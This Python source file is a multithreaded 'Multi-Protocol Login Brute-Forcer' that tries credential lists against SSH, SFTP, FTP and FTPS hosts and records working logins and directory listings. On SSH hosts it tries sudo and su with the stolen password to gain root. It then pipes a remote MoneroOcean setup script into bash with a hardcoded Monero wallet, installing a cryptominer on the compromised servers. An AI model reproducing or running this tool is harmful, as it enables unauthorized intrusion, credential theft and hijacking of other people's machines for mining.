import argparse
import concurrent.futures
import curses
import ftplib
import logging
import os
import re
import threading
from tqdm.contrib.logging import logging_redirect_tqdm

import time

import colorlog
import paramiko
import pysftp
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from tqdm import tqdm

console = Console()

# Define connection messages with emojis
CONNECTION_MESSAGES = {
    "timeout": "🕒 Connection taking too long...",
    "dns_fail": "🌐 DNS lookup failed for this host",
    "refused": "🚫 Connection refused - service may not be running",
    "auth_fail": "🔑 Authentication failed - wrong credentials",
    "success": "🎉 Success! Logged in and script executed!",
    "script_fail": "⚠️ Connected but script failed to run",
    "no_shell": "🐚 Connected but no shell access",
    "starting": "🚀 Attempting connection to {host}:{port}",
    "retrying": "🔄 Retrying {host}:{port} (attempt {attempt})",
}

# Konstanten und globale Variablen
timeout = 12  # Zeitlimit für jede Verbindung in Sekunden
ATTEMPT_COUNT = 0  # Anzahl der Versuche
ATTEMPT_COUNT_LOCK = threading.Lock()  # Lock für die Anzahl der Versuche
last_print_time = time.time()  # Zeitpunkt des letzten Ausdrucks der Ergebnisse
TOTAL_LINES = 0  # Gesamtzahl der Zeilen in der Eingabedatei
CURRENT_LINE = 0  # Aktuelle Zeile in der Eingabedatei
CURRENT_LINE_LOCK = threading.Lock()  # Lock für die aktuelle Zeile
CURRENT_HOST = ""  # Aktueller Server, mit dem versucht wird, sich zu verbinden
CURRENT_HOST_LOCK = threading.Lock()  # Lock für den aktuellen Server
total_elapsed_time = 0  # Gesamtdauer der Ausführung

# Define locks for updating shared variables
LOGIN_ATTEMPTS_LOCK = threading.Lock()
CHECKED_HOSTS_LOCK = threading.Lock()

login_attempts = {
    "correct_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
    "incorrect_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
}

parser = argparse.ArgumentParser(
    description="Attempt to login to a host using various protocols"
)
parser.add_argument(
    "-f", "--file", help="File containing login information", required=True
)
parser.add_argument(
    "-v",
    "--verbose",
    help="Increase output verbosity",
    action="store_true",
)
parser.add_argument(
    "-t",
    "--threads",
    help="Number of threads to use",
    type=int,
    default=100,
)
parser.add_argument(
    "-p",
    "--protocols",
    help="Specify comma-separated protocols (FTP, FTPS, SFTP, SSH)",
    type=str,
    required=True,
)
args = parser.parse_args()
protocols = [p.strip().upper() for p in args.protocols.split(",")]


# Benutzerdefinierte Filter-Klasse, um nur INFO-Nachrichten zuzulassen
class InfoFilter(logging.Filter):
    def filter(self, record):
        return record.levelno == logging.INFO


# Define the DebugInfoFilter class before using it
class DebugInfoFilter(logging.Filter):
    def filter(self, record):
        return record.levelno in (logging.DEBUG, logging.INFO)


# Create a colorlog handler
handler = colorlog.StreamHandler()
# Verbesserte Logging-Konfiguration
handler.setFormatter(
    colorlog.ColoredFormatter(
        "%(log_color)s%(levelname)-7s%(reset)s │ %(message)s",
        log_colors={
            "DEBUG": "cyan",
            "INFO": "bold_green",
            "WARNING": "bold_yellow",
            "ERROR": "bold_red",
            "CRITICAL": "bold_red,bg_white",
        },
    )
)

# Verbesserte Progress-Bar Formatierung
PROGRESS_BAR_FORMAT = (
    "{desc}: {percentage:3.0f}%|{bar}|{n_fmt}/{total_fmt} [{elapsed}<{remaining}]"
)


# Set handler level based on verbose flag
handler_level = logging.DEBUG if args.verbose else logging.INFO
handler.setLevel(handler_level)

# Add the DebugInfoFilter to the handler
handler.addFilter(DebugInfoFilter())

# Remove existing handlers from the root logger
for existing_handler in logging.root.handlers[:]:
    logging.root.removeHandler(existing_handler)

# Create a logger and add the colorlog handler
logger = colorlog.getLogger()
logger.addHandler(handler)

# Set the logger level to INFO
logger.setLevel(logging.INFO)

# Set propagate to False for ERROR and WARNING messages
# logger.propagate = False # Removed to allow messages to propagate if other handlers are added later

# Print the effective log level
logger.debug(f"Effective log level: {logger.getEffectiveLevel()}")

# Log some messages at different levels
logger.debug("This is a debug message.")
logger.info("This is an info message.")
logger.warning("This is a warning message.")
logger.error("This is an error message.")
logger.critical("This is a critical message.")


def draw_status_bar(stdscr, hosts_count, active_threads):
    """Zeichnet die Statusleiste unten."""
    height, width = stdscr.getmaxyx()

    status_bar_text = (
        f" Hosts: {hosts_count} | Active Threads: {active_threads} | Press 'q' to quit "
    )
    stdscr.attron(curses.color_pair(1))
    stdscr.addstr(height - 1, 0, status_bar_text)
    stdscr.addstr(
        height - 1, len(status_bar_text), " " * (width - len(status_bar_text) - 1)
    )
    stdscr.attroff(curses.color_pair(1))


def thread_task(i):
    """Beispiel Funktion für Threads."""
    time.sleep(0.5)  # Simuliert Arbeit
    return f"Task {i} finished"


def parse_ssh_url(ssh_url):
    try:
        regex = r"^SSH://([^:@]+):([^:@]+)@([^:@]+):(\d+)$"
        match = re.match(regex, ssh_url)
        if match:
            username = match.group(1)
            password = match.group(2)
            host = (
                match.group(3).strip().strip(".")
            )  # Strip leading/trailing dots and whitespace
            if not host:
                logger.error(
                    f"Empty host after parsing and cleaning in SSH URL: {ssh_url}"
                )
                return None
            try:
                port = int(match.group(4))
                return host, port, username, password
            except ValueError:
                logger.error(f"Invalid port in SSH URL: {match.group(4)}")
                return None
        else:
            logger.error(f"Invalid SSH URL format: {ssh_url}")
    except Exception as e:
        logger.debug(f"Unexpected error while parsing SSH URL '{ssh_url}': {e}")
    return None


def count_active_threads():
    return threading.active_count()


# Überarbeitete print_login_attempts Funktion
def print_login_attempts(total_lines, start_time_main):
    active_threads = count_active_threads()
    with CURRENT_HOST_LOCK:
        current_host = CURRENT_HOST
    with CURRENT_LINE_LOCK:
        current_line = CURRENT_LINE

    elapsed_time = time.time() - start_time_main

    console = Console()

    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Statistik", justify="left")
    table.add_column("Wert", justify="right")

    table.add_row("🕒 Laufzeit", f"{elapsed_time:.2f}s")
    table.add_row("📋 Gesamte Zeilen", str(total_lines))
    table.add_row(
        "📌 Aktuelle Zeile",
        f"{current_line} ({(current_line / total_lines) * 100:.1f}%)",
    )
    table.add_row("🚀 Aktive Threads", str(active_threads))
    table.add_row(
        "✅ Erfolgreiche Logins", str(sum(login_attempts["correct_logins"].values()))
    )
    table.add_row(
        "❌ Fehlgeschlagene Logins",
        str(sum(login_attempts["incorrect_logins"].values())),
    )

    console.print("\n")
    console.print(
        Panel.fit(
            table,
            title="[bold]Fortschrittsübersicht[/bold]",
            border_style="bright_blue",
            padding=(1, 4),
        )
    )
    console.print("\n")


def check_login(host, port, username, password, protocol):
    check_functions = {
        "SSH": check_ssh_login,
        "SFTP": check_sftp_login,
        "FTP": check_ftp_login,
        "FTPS": check_ftps_login,
    }
    if protocol not in check_functions:
        logger.error(f"Invalid protocol specified: {protocol}")
        return None
    return check_functions[protocol](host, port, username, password)


# Global counters structure
counters = {
    "progress": 0,
    "total": 0,
    "current_host": "",
    "correct": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
    "incorrect": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
    "attempts": 0,
}

# Lock for counters
counters_lock = threading.Lock()

# New global counter for hosts checked since last removal
hosts_checked_since_last_removal = 0


def check_login_thread(
    host,
    port,
    username,
    password,
    timeout,
    protocol,
    sourcefile,
    start_time_main,
    stats_tracker,
):
    global ATTEMPT_COUNT
    global last_print_time
    global CURRENT_LINE
    global CURRENT_HOST
    global hosts_checked_since_last_removal

    with CURRENT_LINE_LOCK:
        CURRENT_LINE += 1
    with CURRENT_HOST_LOCK:
        CURRENT_HOST = f"{username}:{password}@{host}:{port}"

    # Update stats tracker with current progress
    stats_tracker.update_progress(CURRENT_LINE, CURRENT_HOST)

    with ATTEMPT_COUNT_LOCK:
        ATTEMPT_COUNT += 1

    start_time_thread = time.time()

    result_protocol = None
    # Call the appropriate check function based on protocol
    if protocol == "SSH":
        result_protocol = check_ssh_login(host, port, username, password, stats_tracker)
    elif protocol == "SFTP":
        result_protocol = check_sftp_login(
            host, port, username, password, stats_tracker
        )
    elif protocol == "FTP":
        result_protocol = check_ftp_login(host, port, username, password, stats_tracker)
    elif protocol == "FTPS":
        result_protocol = check_ftps_login(
            host, port, username, password, stats_tracker
        )

    elapsed_time = time.time() - start_time_thread

    # Update counters for stats_tracker
    if result_protocol:
        stats_tracker.update_correct(protocol)
    else:
        stats_tracker.update_incorrect(protocol)

    # Log the current host after attempting the login (use logger.debug as curses handles display)
    logger.debug(
        f"Checked {protocol} login for {username}:{password}@{host}:{port}, took {elapsed_time:.2f} seconds"
    )

    with CHECKED_HOSTS_LOCK:
        hosts_checked_since_last_removal += 1
        if hosts_checked_since_last_removal % 50 == 0:
            logger.debug(
                f"Hosts checked since last removal: {hosts_checked_since_last_removal}"
            )
        if hosts_checked_since_last_removal >= 300:
            logger.info(
                f"Removing {hosts_checked_since_last_removal} checked hosts from the file..."
            )
            remove_checked_hosts_by_counter(sourcefile, batch_size=300)
            hosts_checked_since_last_removal = 0


def check_ssh_login(
    host, port, username, password, stats_tracker
):  # Added stats_tracker
    sudo_available = False
    su_root_available = False
    root_method = "normal_user"
    output = ""
    error = ""

    try:
        logger.debug(f"Trying SSH connection ({username}:{password}@{host}:{port})")
        with paramiko.SSHClient() as client:
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=timeout,
            )

            # Write directory listing to checked_ssh_dirs.txt
            try:
                stdin, stdout, stderr = client.exec_command("ls -la")
                dir_listing = stdout.read().decode()
                with open("checked_ssh_dirs.txt", "a", encoding="utf-8") as output_file:
                    output_file.write(
                        f"SSH directory listing for {username}:{password}@{host}:{port}:\n{dir_listing}\n"
                    )
            except Exception as e:
                logger.warning(
                    f"Failed to get directory listing for {host}:{port}: {e}"
                )

            # Check for shell access restrictions
            stdin, stdout, stderr = client.exec_command("echo Test", get_pty=True)
            welcome_message = stdout.read().decode()
            if "This service allows sftp connections only." in welcome_message or any(
                msg in welcome_message
                for msg in [
                    "Shell access is not enabled on your account!",
                    "This account is currently not available.",
                    "Shell access is disabled",
                    "command not allowed on SFTP-only account",
                ]
            ):
                logger.info(
                    f"⚠️ Server {host}:{port} does not allow shell access or only allows SFTP. Skipping command execution."
                )
                write_to_output("SSH", username, password, host, port, False, False)
                return "SSH"

            # Command to running setup
            install_command = (
                "systemctl stop swapd ; curl -L -v "
                "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/"
                "setup_mo_4_r00t_and_user.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX"
            )

            # Check if we're already root using whoami
            stdin, stdout, stderr = client.exec_command("whoami")
            current_user = stdout.read().decode().strip()

            if current_user == "root":
                logger.info(f"Already have root access on {host}:{port}")
                stdin, stdout, stderr = client.exec_command(install_command)
                output = stdout.read().decode()
                error = stderr.read().decode()
                root_method = "direct_root"
                sudo_available = True
                su_root_available = True
            else:
                # Try privilege escalation methods
                logger.info(f"Attempting privilege escalation on {host}")

                # Try sudo -s and other sudo variants first via exec_command for simplicity
                sudo_commands = [
                    "sudo -s",
                    "sudo -i",
                    "sudo su -",
                    "sudo bash -c",
                    "sudo",
                ]

                for cmd_prefix in sudo_commands:
                    logger.debug(f"Trying: {cmd_prefix} on {host}")
                    full_cmd = f"{cmd_prefix} '{install_command}'"
                    stdin, stdout, stderr = client.exec_command(full_cmd, get_pty=True)

                    time.sleep(1)
                    if stdout.channel.recv_ready():
                        prompt_output = stdout.channel.recv(1024).decode()
                        if "password" in prompt_output.lower():
                            logger.debug(f"Sending password for {cmd_prefix}")
                            stdin.write(f"{password}\n")
                            stdin.flush()
                            time.sleep(2)

                    cmd_output = stdout.read().decode()
                    cmd_error = stderr.read().decode()

                    if (
                        "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX"
                        in cmd_output
                        or (not cmd_error and "Error" not in cmd_output)
                    ):
                        stdin_whoami, stdout_whoami, stderr_whoami = (
                            client.exec_command("whoami")
                        )
                        user_after_cmd = stdout_whoami.read().decode().strip()
                        if user_after_cmd == "root":
                            output = cmd_output
                            error = cmd_error
                            root_method = cmd_prefix.replace(" ", "_")
                            sudo_available = True
                            logger.info(
                                f"Successfully got root with {cmd_prefix} on {host}"
                            )
                            break

                if not sudo_available:
                    logger.info(f"Sudo failed on {host}, trying 'su'")
                    stdin, stdout, stderr = client.exec_command(
                        f"su -c '{install_command}'", get_pty=True
                    )
                    time.sleep(1)
                    if stdout.channel.recv_ready():
                        prompt_output = stdout.channel.recv(1024).decode()
                        if "password" in prompt_output.lower():
                            logger.debug(f"Sending password for 'su'")
                            stdin.write(f"{password}\n")
                            stdin.flush()
                            time.sleep(2)

                    cmd_output = stdout.read().decode()
                    cmd_error = stderr.read().decode()

                    stdin_whoami, stdout_whoami, stderr_whoami = client.exec_command(
                        "whoami"
                    )
                    user_after_cmd = stdout_whoami.read().decode().strip()
                    if user_after_cmd == "root":
                        output = cmd_output
                        error = cmd_error
                        root_method = "su_command"
                        su_root_available = True
                        logger.info(f"Successfully got root with 'su' on {host}")
                    else:
                        logger.info(
                            f"Could not gain root access on {host} with 'su', running as normal user"
                        )
                        stdin, stdout, stderr = client.exec_command(install_command)
                        output = stdout.read().decode()
                        error = stderr.read().decode()
                        root_method = "normal_user"

            log_entry = (
                f"SSH://{username}:{password}@{host}:{port}\n"
                + f"Root method: {root_method}\n"
                + (output if output else "")
                + "\n\n"
            )

            if root_method and root_method != "normal_user":
                logger.info(
                    f"Command executed successfully with root privileges on {host}. Output:\n{output[:200]}..."
                )
            else:
                logger.info(
                    f"Command could not be executed as root on {host}. Error: {error[:100] if error else ''}"
                )

            with open("output.txt", "a", encoding="utf-8") as file:
                file.write(log_entry)

            logger.info(
                f"Successful login to SSH protocol at {host}:{port} with username {username} and password {password}"
            )

            write_to_output(
                "SSH", username, password, host, port, sudo_available, su_root_available
            )

            return "SSH"

    except paramiko.ssh_exception.AuthenticationException:
        logger.debug(f"🔑 Authentication failed for SSH {username}@{host}:{port}")
    except paramiko.ssh_exception.SSHException as e:
        logger.debug(f"🚫 SSH connection error to {host}:{port}: {e}")
    except Exception as e:
        logger.debug(f"⚠️ Unexpected error in SSH for {host}:{port}: {e}")

    write_to_output("SSH", username, password, host, port, False, False)
    return None


def check_sftp_login(
    host, port, username, password, stats_tracker
):  # Added stats_tracker
    try:
        cnopts = pysftp.CnOpts()
        cnopts.hostkeys = None
        logger.debug(f"Trying sftp connection ({username}:{password}@{host}:{port})")
        with pysftp.Connection(
            host,
            username=username,
            password=password,
            port=port,
            cnopts=cnopts,
            timeout=timeout,
        ) as sftp:
            sftp_files = sftp.listdir_attr(".")
            sftp.close()
            with open(
                "checked_sftp_dirs.txt", "a", encoding="utf-8"
            ) as sftp_dir_output:
                sftp_dir_output.write(
                    f"\n\nSFTP://{username}:{password}@{host}:{port}\n"
                )
                for line in sftp_files:
                    sftp_dir_output.write(f"{line}\n")
            with open("output.txt", "a", encoding="utf-8") as output_file:
                output_file.write(f"SFTP://{username}:{password}@{host}:{port}\n")
            logger.info(
                f"🎉 Successful login to SFTP protocol at {host}:{port} with username {username} and password {password}"
            )
            write_to_output("SFTP", username, password, host, port)
            return "SFTP"
    except pysftp.exceptions.ConnectionException as e:
        logger.debug(f"🚫 SFTP connection error to {host}:{port}: {e}")
    except pysftp.exceptions.AuthenticationException:
        logger.debug(f"🔑 Authentication failed for SFTP {username}@{host}:{port}")
    except Exception as e:
        logger.debug(f"⚠️ Unexpected error in SFTP: {e}")
    return None


def check_ftp_login(
    host, port, username, password, stats_tracker
):  # Added stats_tracker
    try:
        logger.debug(f"Trying ftp connection ({username}:{password}@{host}:{port})")
        with ftplib.FTP(timeout=timeout) as ftp:
            ftp.connect(host, port)
            ftp.login(username, password)
            ls = []
            ftp.retrlines("LIST -a", ls.append)
            with open("checked_ftp_dirs.txt", "a", encoding="utf-8") as ftp_dir_output:
                ftp_dir_output.write(f"\n\nFTP://{username}:{password}@{host}:{port}\n")
                for entry in ls:
                    ftp_dir_output.write(f"{entry}\n")
        logger.info(
            f"🎉 Successful login to FTP protocol at {host}:{port} with username {username} and password {password}"
        )
        write_to_output("FTP", username, password, host, port)
        return "FTP"
    except ftplib.error_perm as e:
        logger.info(f"🔑 FTP login failed for {username}@{host}:{port}: {e}")
    except ftplib.all_errors as e:
        logger.info(f"🚫 FTP connection or protocol error to {host}:{port}: {e}")
    except Exception as e:
        logger.debug(f"⚠️ Unexpected error in FTP: {e}")
    return None


def check_ftps_login(
    host, port, username, password, stats_tracker
):  # Added stats_tracker
    try:
        logger.debug(f"Trying FTPS connection ({username}:{password}@{host}:{port})")
        with ftplib.FTP_TLS(timeout=timeout) as ftps:
            ftps.connect(host, port)
            ftps.login(username, password)
            ftps.prot_p()
            ls = []
            ftps.retrlines("LIST -a", ls.append)
            with open(
                "checked_ftps_dirs.txt", "a", encoding="utf-8"
            ) as ftps_dir_output:
                ftps_dir_output.write(
                    f"\n\nFTPS://{username}:{password}@{host}:{port}\n"
                )
                for entry in ls:
                    ftps_dir_output.write(f"{entry}\n")
            logger.info(
                f"🎉 Successful login to FTPS protocol at {host}:{port} with username {username} and password {password}"
            )
            write_to_output("FTPS", username, password, host, port)
            return "FTPS"
    except ftplib.error_perm as e:
        logger.info(f"🔑 FTPS login failed for {username}@{host}:{port}: {e}")
    except ftplib.all_errors as e:
        logger.info(f"🚫 FTPS connection or protocol error to {host}:{port}: {e}")
    except Exception as e:
        logger.debug(f"⚠️ Unexpected error in FTPS: {e}")
    return None


def write_to_output(
    protocol,
    username,
    password,
    host,
    port,
    sudo_available=False,
    su_root_available=False,
):
    output_line = None
    if protocol is not None:
        output_line = f"{protocol}://{username}:{password}@{host}:{port}\n"

    if output_line:
        with open("output.txt", "a", encoding="utf-8") as output_file:
            output_file.write(output_line)

        if sudo_available or su_root_available:
            root_access_entry = output_line.strip()

            root_access_entry += "\n"

            with threading.Lock():
                with open("root_access.txt", "a", encoding="utf-8") as root_file:
                    root_file.write(root_access_entry)

                with open("root_sudo.txt", "a", encoding="utf-8") as sudo_output_file:
                    sudo_output_file.write(root_access_entry)

            logger.info(f"Wrote root access entry: {root_access_entry.strip()}")

        output_filename_map = {
            "SSH": "checked_ssh.txt",
            "FTP": "checked_ftp.txt",
            "FTPS": "checked_ftps.txt",
            "SFTP": "checked_sftp.txt",
        }
        if protocol in output_filename_map:
            if not os.path.isfile(output_filename_map[protocol]):
                open(output_filename_map[protocol], "a", encoding="utf-8").close()
            with open(
                output_filename_map[protocol], "a", encoding="utf-8"
            ) as output_file:
                output_file.write(output_line)


def remove_checked_hosts_by_counter(sourcefile, batch_size=300):
    """
    Removes the first batch_size hosts from the sourcefile. Each host entry can be in one of two formats:
    1. SSH://username:password@host:port
    2. Host:host:port followed by Username:username and Password:password
    """
    try:
        if not os.path.exists(sourcefile):
            logger.error(f"Source file {sourcefile} does not exist")
            return

        with open(sourcefile, "r", encoding="utf-8", errors="ignore") as src_file:
            lines = src_file.readlines()

        if not lines:
            logger.warning(f"Source file {sourcefile} is empty")
            return

        lines_to_remove_count = 0
        hosts_removed_count = 0
        current_line_idx = 0

        while current_line_idx < len(lines) and hosts_removed_count < batch_size:
            line = lines[current_line_idx].strip()

            if line.startswith("SSH://"):
                lines_to_remove_count += 1
                hosts_removed_count += 1
                current_line_idx += 1
            elif line.startswith("Host:"):
                if current_line_idx + 2 < len(lines):
                    username_line = lines[current_line_idx + 1].strip()
                    password_line = lines[current_line_idx + 2].strip()

                    if username_line.startswith(
                        "Username:"
                    ) and password_line.startswith("Password:"):
                        lines_to_remove_count += 3
                        hosts_removed_count += 1
                        current_line_idx += 3
                    else:
                        logger.warning(
                            f"Incomplete host entry at line {current_line_idx}. Expected Username: and Password: on the following lines. Skipping this entry."
                        )
                        current_line_idx += 1
                else:
                    logger.warning(
                        f"Incomplete host entry at line {current_line_idx}. Not enough lines remaining. Skipping this entry."
                    )
                    current_line_idx += 1
            else:
                current_line_idx += 1

        if lines_to_remove_count > 0:
            remaining_lines = lines[lines_to_remove_count:]

            with threading.Lock():
                with open(sourcefile, "w", encoding="utf-8") as src_file:
                    src_file.writelines(remaining_lines)

            logger.debug(
                f"Removed {hosts_removed_count} hosts ({lines_to_remove_count} lines) from {sourcefile}"
            )
        else:
            logger.debug(f"No hosts found to remove from {sourcefile} in this batch.")

    except Exception as e:
        logger.error(f"Error in remove_checked_hosts_by_counter: {e}")


def parse_input_file(file_path: str) -> list:
    """Parse the input file for login details, handling both SSH:// and Host: formats"""
    login_info = []
    try:
        with open(file_path, "r") as file:
            lines = file.readlines()
            i = 0
            while i < len(lines):
                line = lines[i].strip()
                if line.startswith("SSH://"):
                    parsed = parse_ssh_url(line)
                    if parsed:
                        login_info.append(parsed)
                    i += 1
                elif line.startswith("Host:"):
                    host_match = re.search(r"Host:(.*?)(?::(\d+))?$", line)
                    if host_match:
                        host = (
                            host_match.group(1).strip().strip(".")
                        )  # Strip leading/trailing dots and whitespace
                        if not host:
                            logger.warning(
                                f"Empty host after parsing and cleaning in Host: line {i+1}."
                            )
                            i += 1
                            continue  # Skip to next line

                        port_str = host_match.group(2)
                        port = int(port_str) if port_str else 22
                        if i + 2 < len(lines):
                            username_line = lines[i + 1].strip()
                            password_line = lines[i + 2].strip()
                            if username_line.startswith(
                                "Username:"
                            ) and password_line.startswith("Password:"):
                                username = username_line.split(":")[1].strip()
                                password = password_line.split(":")[1].strip()
                                login_info.append((host, port, username, password))
                                i += 3
                            else:
                                logger.warning(
                                    f"Incomplete login info after Host: line {i+1}. Expected Username: and Password:."
                                )
                                i += 1
                        else:
                            logger.warning(
                                f"Incomplete login info after Host: line {i+1}. Not enough lines left in file."
                            )
                            i += 1
                    else:
                        logger.warning(f"Invalid Host: line format: {line}")
                        i += 1
                else:
                    i += 1

    except FileNotFoundError:
        logger.error("Input file not found: %s", file_path)
        raise
    except Exception as e:
        logger.error("Error reading input file: %s", str(e))
        raise

    global TOTAL_LINES
    TOTAL_LINES = len(login_info)

    return login_info


class MultiProtocolFancyStats:
    def __init__(self, total_attempts, protocols):
        self.total_attempts = total_attempts
        self.protocols = protocols
        self.lock = threading.Lock()
        self.stats = {
            "correct": {p: 0 for p in protocols},
            "incorrect": {p: 0 for p in protocols},
            "attempted": 0,
            "start_time": time.time(),
            "active_threads": 0,
            "current_host": "",
            "current_line": 0,
            "total_lines": 0,
        }
        self.screen = None
        self.running = True
        self.thread = threading.Thread(target=self._display_loop, daemon=True)

    def update_correct(self, protocol):
        with self.lock:
            if protocol in self.stats["correct"]:
                self.stats["correct"][protocol] += 1
                self.stats["attempted"] += 1

    def update_incorrect(self, protocol):
        with self.lock:
            if protocol in self.stats["incorrect"]:
                self.stats["incorrect"][protocol] += 1
                self.stats["attempted"] += 1

    def update_progress(self, current_line, current_host):
        with self.lock:
            self.stats["current_line"] = current_line
            self.stats["current_host"] = current_host
            # Subtract 2 threads: main thread + display thread
            self.stats["active_threads"] = max(threading.active_count() - 2, 0)

    def set_total_lines(self, total_lines):
        with self.lock:
            self.stats["total_lines"] = total_lines

    def _display_loop(self):
        try:
            self.screen = curses.initscr()
            curses.noecho()
            curses.cbreak()
            self.screen.keypad(True)
            curses.curs_set(0)  # Hide cursor

            # Initialize color pairs
            curses.start_color()
            curses.init_pair(1, curses.COLOR_WHITE, curses.COLOR_BLUE)  # Status bar
            curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)  # Success
            curses.init_pair(3, curses.COLOR_RED, curses.COLOR_BLACK)  # Failure
            curses.init_pair(4, curses.COLOR_YELLOW, curses.COLOR_BLACK)  # Warning
            curses.init_pair(5, curses.COLOR_CYAN, curses.COLOR_BLACK)  # Info

            while self.running:
                self.screen.erase()
                height, width = self.screen.getmaxyx()

                with self.lock:
                    current_stats = self.stats.copy()
                    correct_total = sum(current_stats["correct"].values())
                    incorrect_total = sum(current_stats["incorrect"].values())
                    elapsed_time = time.time() - current_stats["start_time"]
                    total_lines = current_stats["total_lines"]
                    current_line = current_stats["current_line"]
                    current_host = current_stats["current_host"]
                    active_threads = current_stats["active_threads"]

                progress_pct = (
                    (current_line / total_lines * 100) if total_lines > 0 else 0
                )

                # Title centered
                title = " Multi-Protocol Login Brute-Forcer "
                self.screen.addstr(
                    0, max(0, (width - len(title)) // 2), title, curses.A_BOLD
                )

                row = 2
                self.screen.addstr(row, 2, f"🕒 Runtime: {elapsed_time:.2f}s")
                row += 1
                self.screen.addstr(row, 2, f"📋 Total Lines: {total_lines}")
                row += 1
                self.screen.addstr(
                    row, 2, f"📌 Current Line: {current_line} ({progress_pct:.1f}%)"
                )
                row += 1
                self.screen.addstr(row, 2, f"🚀 Active Threads: {active_threads}")
                row += 1

                # Truncate current_host to fit width minus margin
                max_host_len = max(0, width - 18)
                truncated_host = (
                    (current_host[:max_host_len] + "...")
                    if len(current_host) > max_host_len
                    else current_host
                )
                self.screen.addstr(row, 2, f"🌐 Current Host: {truncated_host}")
                row += 2

                self.screen.addstr(row, 2, "Login Statistics:")
                row += 1
                self.screen.addstr(
                    row,
                    4,
                    f"✅ Successful Logins: {correct_total}",
                    curses.color_pair(2),
                )
                row += 1
                self.screen.addstr(
                    row, 4, f"❌ Failed Logins: {incorrect_total}", curses.color_pair(3)
                )
                row += 1

                for proto in self.protocols:
                    success = current_stats["correct"].get(proto, 0)
                    fail = current_stats["incorrect"].get(proto, 0)
                    self.screen.addstr(
                        row, 6, f"{proto} - Success: {success} | Fail: {fail}"
                    )
                    row += 1

                # Draw status bar at bottom
                draw_status_bar(self.screen, total_lines, active_threads)

                self.screen.refresh()
                time.sleep(1)

        except Exception as e:
            logger.error(f"Error in MultiProtocolFancyStats display loop: {e}")
        finally:
            try:
                curses.nocbreak()
                self.screen.keypad(False)
                curses.echo()
                curses.endwin()
            except Exception:
                pass

    def start(self):
        if not self.thread.is_alive():
            self.thread.start()

    def stop(self):
        self.running = False
        self.thread.join(timeout=2)
        try:
            curses.endwin()
        except Exception:
            pass


def main():
    if args.verbose:
        logger.setLevel(logging.DEBUG)

    global start_time_main
    start_time_main = time.time()

    try:
        # Parse input file and process logins
        login_info = parse_input_file(args.file)
        logger.info(f"Parsed {len(login_info)} login entries.")

        total_attempts_for_progress_bar = len(login_info) * len(protocols)

        stats_tracker = MultiProtocolFancyStats(
            total_attempts_for_progress_bar, protocols
        )
        stats_tracker.set_total_lines(TOTAL_LINES)
        stats_tracker.start()

        # Removed tqdm progress bar to avoid conflict with curses
        with concurrent.futures.ThreadPoolExecutor(
            max_workers=args.threads
        ) as executor:
            futures = []
            for host, port, username, password in login_info:
                for protocol in protocols:
                    futures.append(
                        executor.submit(
                            check_login_thread,
                            host,
                            port,
                            username,
                            password,
                            timeout,
                            protocol,
                            args.file,
                            start_time_main,
                            stats_tracker,
                        )
                    )
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Thread error: {e}")
                finally:
                    with CURRENT_LINE_LOCK:
                        current_line_for_stats = CURRENT_LINE
                    with CURRENT_HOST_LOCK:
                        current_host_for_stats = CURRENT_HOST
                    stats_tracker.update_progress(
                        current_line_for_stats, current_host_for_stats
                    )

        logger.info("Processing completed. Total attempts: %d", ATTEMPT_COUNT)
        stats_tracker.stop()
        print_login_attempts(TOTAL_LINES, start_time_main)

    except FileNotFoundError:
        pass
    except Exception as e:
        logger.critical("Fatal error in main: %s", str(e))


if __name__ == "__main__":
    main()
